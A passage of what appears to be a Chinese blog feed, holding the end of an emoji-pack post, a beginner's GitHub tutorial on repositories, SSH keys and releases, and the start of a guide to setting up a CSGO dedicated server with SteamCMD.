/></td><td align="center"><img src="https://valinecdn.bili33.top/Cute-Emoji/010.png" style="zoom:50%;" /></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Little-Bad">小坏坏表情包</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Yurui-Neko">Yurui-Neko</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Cute-Emoji">Cute-Emoji</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/Set667/032.png" style="zoom:50%;" /></td><td align="center"><img src="https://valinecdn.bili33.top/Marup/038.png" style="zoom:50%;" /></td><td align="center"><img src="https://valinecdn.bili33.top/Convenience-Store-Notes2/010.png" style="zoom:50%;" /></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Set667">Set667</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Marup">Marup</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Convenience-Store-Notes2">Convenience Store Notes2</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/Coolapk/coolapk_emotion_71.png"></td><td align="center"><img src="https://valinecdn.bili33.top/aodamiao/01.gif"></td><td align="center"><img src="https://valinecdn.bili33.top/lengtu/04.gif"></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Coolapk">Coolapk酷安</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/aodamiao">aodamiao嗷大喵</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/lengtu">lengtu冷兔</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/QQ/tuosai.gif"></td><td align="center"><img src="https://valinecdn.bili33.top/dingtalk/emotion_107.png"></td><td align="center"><img src="https://valinecdn.bili33.top/Heybox/expression_heziji_22.png"><img src="https://valinecdn.bili33.top/Heybox/expression_cube_wa.png"></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/QQ">QQ官方表情</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/dingtalk">钉钉官方表情</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Heybox">小黑盒表情包（包括盒娘和方块）</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/Majotabi/367516718.png"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Majotabi">魔女之旅Majotabi（官方）</a></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h3><p>本仓库内所有图片均来源于网络，仅供学习交流使用。若用户违反相关法律法规造成损失，将由用户自行承担，本仓库所有者和PR提交者不承担一切责任！</p><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p><a href="https://app.fossa.com/projects/git%2Bgithub.com%2FGamerNoTitle%2FValine-Magic?ref=badge_large"><img src="https://app.fossa.com/api/projects/git%2Bgithub.com%2FGamerNoTitle%2FValine-Magic.svg?type=large" alt="FOSSA Status"></a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github的基本用法 —— 给小白的新手教程</title>
      <link href="/posts/Github-Basic/"/>
      <url>/posts/Github-Basic/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info flat"><p>本文是写给初到Github的新手们的，其中大量为基础内容，如果你不是Github新手玩家你可以关闭本页面！</p></div><h3 id="开头语"><a href="#开头语" class="headerlink" title="开头语"></a>开头语</h3><p>初来乍到的萌新们，刚到Github，你们是不是一脸懵逼？我是谁？我在哪？我要干哈？<br>Github是全球最大的 <del>同性交友平台</del> 代码托管平台，在这里你可以看到各种大佬，例如国内最大的MC红石服务器<a href="https://tis.world/">TIS</a>的<a href="https://github.com/TISUnion">插件开发组@TISUnion</a>，或者是我们再熟悉不过了的<a href="https://github.com/microsoft">微软Microsoft</a>；当然不只是代码，Github里面也有各种文化仓库，这里举个很好玩的仓库作为例子——表情包仓库<a href="https://github.com/zhaoolee/ChineseBQB">ChineseBQB</a>，可谓是表情包的聚集地；Github上甚至还有你想不到的项目（<a href="https://github.com/komeiji-satori/Dress">是什么项目我就不说了，自己点我查看</a>）<br><img src='https://gamernotitle.coding.net/p/BQB/d/BQB/git/raw/master/023Emoji_%E8%A1%A8%E6%83%85%E7%AC%A6%E5%8F%B7BQB/Emoji00087.JPG' height=100 width=100></img></p><p>接下来，我就来跟你讲讲Github怎么使用。话不多说，让我们开始吧</p><hr><h3 id="主页管理"><a href="#主页管理" class="headerlink" title="主页管理"></a>主页管理</h3><p>当你注册完Github并登录后，Github会将你带到首页，这里有点类似很多服务器的仪表盘吧（如图）</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Home.png" alt="Github主页"></p><p>其中，左边一块是跟个人有关的，包括活动仓库和所在团队，活动仓库是你发过issue、PR(pull request)，点过Watch、Star、Fork的仓库，触发以上操作（上面的操作后面会说）都会将你操作的仓库添加到左边的活动仓库列表，便于你进行寻找；所在团队则是当你创建&#x2F;加入一个团队并被分配到Team（队，有点类似于部门）后显示</p><p>中间那一栏是与你有关的Github的活动，Github会在上面优先列出你近期的活动（近期具体是多少天以内就不知道了，没算过），下面则会列出所有与你有关的活动，顺序为从新到旧。你可以看到你Follow的人的动态，也可以看到与你有关的动态（如别人Follow你，Star&#x2F;Fork你的仓库等等）</p><p>右边一栏则是被称为Github Explore（Github探索）的东西，Github会根据你在Github的仓库访问情况推荐你可能感兴趣的仓库，右边一栏会列出3个，点击右边那一栏的<code>Explore More→</code>则会打开一个新的页面，里面罗列出Github今日给你推荐的项目仓库</p><p>最上面一行是导航栏，导航栏在Github的任何页面都会展示。点击Pull Requests就会列出你与你有关的所有PR，同理，点击issue也是一样。Marketplace会打开Github的插件库，里面有各种插件供你选择，有免费的当然也有付费的；Explore则是会打开跟右边Explore More一样的界面；点击右上角的个人头像可以有更多的选项，点击会出来各种管理，这个我们到个人管理再讲。</p><p>（什么？你问我的导航栏为什么是彩色的？看来你是没用过Stylus呢，装完Stylus后<a href="http://userstyles.org/styles/138989">安装这个样式</a>就可以让Github变成彩色的了）</p><hr><h3 id="个人管理"><a href="#个人管理" class="headerlink" title="个人管理"></a>个人管理</h3><p>当你点击导航栏里面的头像，Github会给你弹出下面这个列表</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Nav-List.png" alt="Github个人菜单"></p><p>①表示你登录的用户，这里我是用自己的用户登录的，所以写的是GamerNoTitle</p><p>②是你的个人信息，点击后会进入个人信息页面</p><p>③是你的仓库，点击后会进入自己的仓库列表</p><p>④是项目列表，不过我自己没怎么用，而且本篇教程我也不打算讲Project</p><p>⑤是你Star过的项目，点击后会对你Star的项目进行列出的操作</p><p>⑥是用来发布代码片段的Gist，没啥用（因为你在GFW的保护下）</p><p>⑦、⑧是与Github有关的，能够帮助你使用Github并且获取Github的新功能</p><p>⑨是设置，设置我们晚点讲</p><p>⑩是登出，当然就是退出啦</p><p>我们进入Profile查看一下，这里会列出你的各种信息，包括你自己设定的Slogan、你的学校、你的地理位置、你的邮箱（可以设置多个，但只有一个对外展示，未登陆者不会显示）、你的网站</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Profile.png" alt="Github Profile"></p><p>右边上面是你PIN（钉~）的仓库，如果你想让别人一到你的个人页面就能看到你的Breaking Repositories的话你可以把你的仓库PIN到上面来；下面的小方格则是一年内你的Contribution（贡献），Commit数量越多，绿色越深；再往下就是你的活动了</p><p>在PINNED的上面，从左到右的按钮依次是：仪表盘、仓库、项目、包、Star、追随者、你追随的人。Star可以在个人菜单（上面那张标了序号的图）里面点Your Star进入，同样，仓库和项目也可以</p><p>更详细的个人资料设置，可以在设置里面进行更改，其中可更改的包括你的用户名、邮箱等</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Settings-Profile.png" alt="Github Settings - Profile"></p><hr><h3 id="仓库管理"><a href="#仓库管理" class="headerlink" title="仓库管理"></a>仓库管理</h3><h4 id="仓库创建"><a href="#仓库创建" class="headerlink" title="仓库创建"></a>仓库创建</h4><p>当你决定在Github托管你自己的代码的时候，你就可以开始创建仓库了。不过在此之前，请确保你会使用Git，Git的简单用法下面会略微涉及，但本篇绝对不会教你《Git从入门到精通》，Git的用法请自行百度。</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-New-Repo.png" alt="Github新建仓库"></p><p>我们点击导航栏里面的<code>+</code>号，选择<code>New repository</code>，Github会带我们到新建仓库的页面。在Repository name中填入你想要的仓库名字，仓库名可以用英文和任意符号，甚至是中文（不推荐），但是在网址中无法被识别的字符会统一被替换成-，不管你有多少个连在一起（包括中文），例如我这里有个仓库名字是<code>!@#$%^&amp;*()</code>，那么Github会让你创建你的仓库名为<code>!@#$%^&amp;*()</code>，但是网址中只会变成<code>https://github.com/:user/-</code>，没错，Github直接用一个<code>-</code>代替了你的<code>!@#$%^&amp;*()</code>，所以仓库命名我这里提出以下几点建议：</p><ul><li>仓库名字尽量为英文</li><li>仓库名中尽量不要含有特殊字符，如果需要空格的话将空格替换为<code>-</code></li><li>仓库名能够让别人一眼看出这个仓库是用来做什么的</li></ul><p>遵循上面的这些建议，我相信你的仓库命名应该不会乱的</p><p>在下面有Description，填写了以后会在别人搜索或者是访问你的仓库的时候展示（如图）</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Descr-in-Search.png" alt="Description搜索展示"></p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Descr-in-Repo.png" alt="Description仓库展示"></p><p>再往下就是仓库的公开性，Public是公开，任何人都能访问你的仓库（只读）；Private是私人仓库只有你和被你邀请的人才能够访问</p><p>再下去就是用一个README初始化你的仓库，如果勾选了Github会新建一个README来初始化你的仓库，但是README一般都是按下面的格式写的</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># :Title</span></span><br></pre></td></tr></table></figure><p>没错，就只有这一行，所以我一般不勾选</p><h4 id="仓库初始化"><a href="#仓库初始化" class="headerlink" title="仓库初始化"></a>仓库初始化</h4><p>这里我先新建一个名为<code>Tutorial</code>的仓库，公开仓库并且不勾选README初始化</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Repo-Tutorial.png" alt="Github仓库新仓库"></p><p>如上图，我已经新建了一个船新的仓库我们现在要手动初始化一次</p><p>我这里新建一个文件夹，在这里打开命令行，先用Git初始化这个文件夹，并在里面放入一个README.md文件</p><p>使用Git命令来推送我们的更改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git init    <span class="comment"># 初始化文件夹（在文件夹内创建一个.git文件夹用于存储git信息）</span></span><br><span class="line">$ git add .    <span class="comment"># 添加所有更改，当然你也可以添加特定的更改，把.换成文件路径即可</span></span><br><span class="line">$ git commit -m <span class="string">&quot;init&quot;</span>    <span class="comment"># 提交更改，并留下信息为&quot;init&quot;</span></span><br><span class="line">$ git remote add origin git@github.com:GamerNoTitle/Tutorial.git    <span class="comment"># 添加仓库地址到名为origin的git目标</span></span><br><span class="line">$ git push -u origin master    <span class="comment"># Git推送到仓库，仅第一次加入git远程目标时需要，后续直接git push</span></span><br></pre></td></tr></table></figure><p>我这里使用的是SSH推送方式，你也可以使用HTTPS的方式，不过缺点就在于每次都要输入Github的账号信息。</p><h5 id="添加SSH秘钥"><a href="#添加SSH秘钥" class="headerlink" title="添加SSH秘钥"></a>添加SSH秘钥</h5><p>那么如何使用SSH方式呢？我们先打开命令行，使用<code>ssh-keygen</code>来创建我们的SSH秘钥，如果要求你输入的话可以直接留空回车（高级用户请自便）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/bili33/.ssh/id_rsa):</span><br><span class="line">Created directory <span class="string">&#x27;/home/bili33/.ssh&#x27;</span>.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/bili33/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/bili33/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:jdynahazKmHSKBGge2KnSDNlUFM7+AVADYeW4NY7CjY GamerNoTitle@ADMIN-PC</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|oo+*B+           |</span></span><br><span class="line"><span class="string">|+ o++.o          |</span></span><br><span class="line"><span class="string">|.+.= o .         |</span></span><br><span class="line"><span class="string">|o.o o o. +       |</span></span><br><span class="line"><span class="string">|+E.* .  S o .    |</span></span><br><span class="line"><span class="string">|BoX =   o  o     |</span></span><br><span class="line"><span class="string">|.+ o .   +.      |</span></span><br><span class="line"><span class="string">|    .   +.       |</span></span><br><span class="line"><span class="string">|     ..+.        |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure><p>然后Windows会在<code>C:\Users\:user\.ssh</code>下创建两个文件，linux则会在<code>/.ssh</code>创建两个文件，两个系统创建的文件是一样的，都是<code>id_rsa</code>和<code>id_rsa.pub</code>。</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Key.png" alt="Github SSH KEY页面"></p><p>我们需要用记事本或者任意文本编辑器打开<code>id_rsa.pub</code>，将里面的内容复制，然后点开Github设置，点击左边的<code>SSH and GPG Keys</code>，点击右上角的<code>NEW SSH KEY</code></p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Add-Key.png" alt="Github添加KEY"></p><p>将你的<code>id_rsa.pub</code>的内容粘贴到下面的大框框里面，上面填上一个便于你自己辨识的名字，然后保存</p><p>这样一来，你当前的设备就有对Github仓库的访问权限。除非你重新生成了SSH秘钥，否则无需对秘钥进行更改。</p><h4 id="仓库初始化完成"><a href="#仓库初始化完成" class="headerlink" title="仓库初始化完成"></a>仓库初始化完成</h4><p>看下面，我已经将我的README.md推送到Github仓库了</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-repo-Pushed.png" alt="Github推送完成"></p><h4 id="仓库设置"><a href="#仓库设置" class="headerlink" title="仓库设置"></a>仓库设置</h4><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Repo-Settings.png" alt="Github仓库设置"></p><p>我们点击上面的Settings，Github会把我们带到仓库的设置界面</p><p>在Options里面，有仓库的基本设定：仓库名、仓库封面图、仓库功能、Github Pages服务，还有Github所谓的危险区（对仓库的所有权或者状态进行管理的分区</p><p>左边则还有各种设置项，可以用Manage access来授予别人访问权限，当然也可以为仓库添加特定的SSH key等等</p><h4 id="仓库发行"><a href="#仓库发行" class="headerlink" title="仓库发行"></a>仓库发行</h4><p>当我们编译完自己的程序，想要发布可执行程序的时候，就需要Release功能（当然不止于这种情况，也有想要薅一把Github的羊毛把Github当做图床加上Jsdelivr作为CDN的用法）</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-repo-nav.png" alt="Github仓库导航栏"></p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-no-Release.png" alt="Github仓库无发行版"></p><p>我们点击顶端的Release按钮，如果你之前没有Release的话界面应该是像上面这样的，我们就要点create a release来创建我们的发行</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-have-Release.png" alt="Github Release有发行版"></p><p>如果你有发布过release，那你的界面应该是这样的，我们就要点右上角<code>Draft a New Release</code>来发布</p><p><img src="https://cdnjsdelivr.bili33.workers.dev/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/img/Github-Basic/Github-Draft-a-New-Release.png" alt="Github新建Release"></p><p>在这个界面，在左边最小的那个框里面填写版本号，版本号应该像是<code>v1.0.0</code>、<code>a1.0</code>这样的，取得复杂了就很麻烦（当然只是自己用的话请随便），在长条框里面填写自己的标题，下面的大框框填写自己这个版本的详细内容，填写完后点击最下面的publish release即可。</p><div class="note info flat"><p>等到我想到还有什么是要跟小白说的我会再发的，现在暂时想到这么多，当然你也可以留言</p></div><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>我还真的没想到有人玩Hexo不会用Github，然后就写了这一篇文章……</p><p>最近做了使用MCDR的服务器能够使用的两个插件<a href="https://github.com/GamerNoTitle/SimpleOP">SimpleOP</a>和<a href="https://github.com/GamerNoTitle/MCDR-WikiSearcher">MCDR-WikiSearcher</a>，前者是根据佛冷的修改的，后者是因为TIS发布的那个用不了，然后就自己整了一个，也就整了3小时，其实不难</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSGO服务器架设指南</title>
      <link href="/posts/CSGO-Server/"/>
      <url>/posts/CSGO-Server/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>“GOGOGO”最近我身边的小伙伴们都拉我打CSGO，还想打内战……然后就让我架设一个社区服务器。讲真，架设社区服务器的坑挺多的，我会在文中尽量把我架设服务器的过程给叙述完整，帮助你们，同样也帮助我在我忘记的时候回想起来</p><p>废话不多说，让我们开始吧（干货警告）</p><hr><h3 id="你需要准备："><a href="#你需要准备：" class="headerlink" title="你需要准备："></a>你需要准备：</h3><p>一台有公网IP的服务器</p><p>一个Steam账号（无任何的VAC记录，没有社区违规记录）</p><div class="note info flat"><p>我这里使用的是阿里云的轻量应用服务器（Ubuntu 18.04 LTS），如果你也想使用阿里云，但是没有阿里云账号，可以到下边的这个链接进行注册（顺带帮我填一下邀请码秋梨膏）</p><p><a href="https://www.aliyun.com/minisite/goods?userCode=05u8nbft">https://www.aliyun.com/minisite/goods?userCode=05u8nbft</a></p><p>然后可以到<a href="https://promotion.aliyun.com/ntms/act/campus2018.html?accounttraceid=fa8188b3-66d9-4f56-b466-597502576f22">阿里云云翼计划</a>购买轻量应用服务器（下面的云服务器ECS），亲测一个服务器10个人带的动没啥问题</p></div><h3 id="Linux搭建方法"><a href="#Linux搭建方法" class="headerlink" title="Linux搭建方法"></a>Linux搭建方法</h3><h4 id="Steamcmd下载"><a href="#Steamcmd下载" class="headerlink" title="Steamcmd下载"></a>Steamcmd下载</h4><p>首先，你需要下载Steamcmd，这是一个Steam的官方软件，关于它的详细信息，你可以在<a href="https://developer.valvesoftware.com/wiki/SteamCMD">这里</a>找到（V社官方WIKI，无需梯子）</p><h5 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h5><p>如果你的服务器是64位的Linux系统，你需要运行以下命令安装32位的运行库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository multiverse</span><br><span class="line">$ sudo dpkg --add-architecture i386</span><br><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt install lib32gcc1 steamcmd </span><br></pre></td></tr></table></figure><p>然后就可以直接使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt install steamcmd<span class="comment"># Ubuntu用户</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install steamcmd <span class="comment"># CentOS用户</span></span><br></pre></td></tr></table></figure><p>来安装Steamcmd，如果你更新了yum库或者apt库仍然提示未找到steamcmd包，那么你可以使用手动安装的方法</p><h5 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h5><p>手动安装就是自己从V社的官方服务器中获取可执行文件，当然在这之前，你还是需要安装32位的运行环境</p><ul><li><p>Ubuntu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install lib32gcc1</span><br></pre></td></tr></table></figure></li><li><p>CentOS X86</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install glibc libstdc++</span><br></pre></td></tr></table></figure></li><li><p>CentOS X64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install glibc.i686 libstdc++.i686</span><br></pre></td></tr></table></figure></li></ul><p>安装完运行库后，我们需要下载steam官方的软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sqL <span class="string">&quot;https://steamcdn-a.akamaihd.net/client/installer/steamcmd_linux.tar.gz&quot;</span> | tar zxvf -</span><br></pre></td></tr></table></figure><p>使用上面这一条命令下载软件包，解压后应该有个<code>steamcmd.sh</code>和一个文件夹。我们直接运行steamcmd.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash steamcmd.sh</span><br></pre></td></tr></table></figure><p>然后它会进入更新状态，就像是你平常打开Steam的那个小白窗</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@CSGO/img/CSGO-Server/Steam-Updating.png" alt="Steam更新小白窗"></p><p>等它最后显示为<code>Steam&gt;</code>并且是输入状态的时候，它就完成了更新。至此，你就完成了Steamcmd的安装</p><p>按照steam官方的意思，他们不推荐使用root账户来运行steamcmd（我也不知道为什么），然而我实际上用root账户开下来也没有什么不妥的地方，所以是否使用root账户取决于你们自己吧</p><h4 id="CSGO服务器安装"><a href="#CSGO服务器安装" class="headerlink" title="CSGO服务器安装"></a>CSGO服务器安装</h4><p>在这之前，请确保你的服务器装得下CSGO的所有文件，服务端的大小跟客户端没差多少，请确定你的服务器有那么多的空间！！！</p><p>我们在Steamcmd里面输入<code>login anonymous</code>来进行匿名登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Steam&gt;login anonymous</span><br></pre></td></tr></table></figure><p>当然你也可以使用你自己的账号登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Steam&gt;login :Steam_Account :Password :Steam_Guard</span><br></pre></td></tr></table></figure><p>其中，<code>:Steam_Account</code>是你的Steam登录名，<code>:Password</code>是你的密码，<code>:Steam_Guard</code>是你的Steam令牌，如果你是使用邮箱令牌的，那你可以不加上令牌，先发出登录请求，等Steam执行了登录以后会让你输入你的邮箱验证码的</p><p>登录完成后，我们的Steamcmd就正式接入了Steam网络了。我们需要安装CSGO服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Steam&gt;app_update 740 validate</span><br></pre></td></tr></table></figure><p>用上面的命令来安装CSGO服务器，<code>740</code>是CSGO服务器这款应用在Steam的注册ID，<code>validate</code>是文件验证，初次安装需要进行文件验证，以后升级可以直接使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Steam&gt;app_update 740</span><br></pre></td></tr></table></figure><p>来进行升级。如果你的服务器不够空间，会给你报错，你可以先退出Steamcmd，在linux的命令行中使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">df</span> -h</span><br></pre></td></tr></table></figure><p>来查看你的空间是否足够，一般来说需要查看最右边<code>Mounted on</code>的<code>/</code>这一个目录的剩余，<code>Avail</code>就是这个目录剩余的空间。</p><p>当你输入命令安装CSGO服务器后，Steamcmd会进入安装状态等到最后提示<code>Successfully installed</code>即为安装完成，你的CSGO已经被安装在了<code>./steamapps/common/Counter-Strike Global Offensive Beta - Dedicated Server</code>里面了</p><p>如果你觉得它太长了，你可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Steam&gt;force_install_dir :<span class="built_in">dir</span></span><br></pre></td></tr></table></figure><p>来安装到你觉得合适的地方，请将<code>:dir</code>换成你要的目录，并且在<code>app_update</code>前执行！</p><h4 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h4><p>安装完了以后，我们就要进行服务器的配置。CSGO服务器默认的配置很令人头疼的：竞技模式、TK开启、TK惩罚等等等等，各种不方便的东西都有。我们需要修改服务器的配置</p><p>CSGO也给我们提供了很方便的方法修改服务器，我们可以使用一个文件进行修改。</p><p>我们在CSGO服务器目录下的<code>./csgo/cfg</code>文件夹中新建一个文件叫做<code>server.cfg</code>，然后在这里面修改我们需要的配置。我先贴出<a href="">我的配置</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 